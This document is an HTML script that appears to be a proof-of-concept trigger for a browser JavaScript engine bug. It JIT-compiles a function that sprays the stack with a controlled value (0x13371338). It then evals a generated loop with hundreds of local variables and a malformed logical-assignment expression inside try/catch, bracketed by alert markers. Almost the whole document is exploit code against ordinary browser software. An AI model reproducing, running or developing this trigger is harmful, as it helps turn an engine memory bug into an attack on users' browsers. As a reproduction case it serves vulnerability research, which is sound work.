<script>

alert(1);

OFFSET_SIZE = 400;

// Fill the stack with the return value of the provided function.
function stackspray(f, x, d) {
  if(d==0) return;
  // This function will spill all the local variables to the stack
  // since they are needed for the returned array.
  let v0 = f*x;
  let v1 = f*x*x;
  let v2 = f*x*x*x;
  let v3 = f*x*x*x*x;
  let v4 = f*x*x*x*x*x;
  let v5 = f*x*x*x*x*x*x;
  let v6 = f*x*x*x*x*x*x*x;
  let v7 = f*x*x*x*x*x*x*x*x;
  let v8 = f*x*x*x*x*x*x*x*x*x;
  let v9 = f*x*x*x*x*x*x*x*x*x*x;
  let v10 = f*x*x*x*x*x*x*x*x*x*x*x;
  let v11 = f*x*x*x*x*x*x*x*x*x*x*x*x;
  stackspray(f,x, d-1);
  return [v0, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11];
}
    
function preparestackspray() {
   // JIT compile the stack spray.
   for (let i = 0; i < 10000; i++) {
     // call twice in different ways to prevent inlining.
     stackspray(1337,1, 10);
     stackspray(2,1, 1);
   }
}
preparestackspray();

function main() {
offset_str = '';
for(let i = 0; i<OFFSET_SIZE; i++) {
  offset_str += "let offset_" + i + "=1;"
}

code = `
stackspray(0x13371338,1, 200);
for(var i=0; i<(10000 + 1); i++) {
  ${offset_str}
  const var08 = 1;
  if(i==0) {
    try {
      undefined[0] ||= var08 *= some;
	  alert("test 1");
    }
    catch { }
    finally { }
  }
}
`;

eval(code);
}
main();


alert(2);

</script>
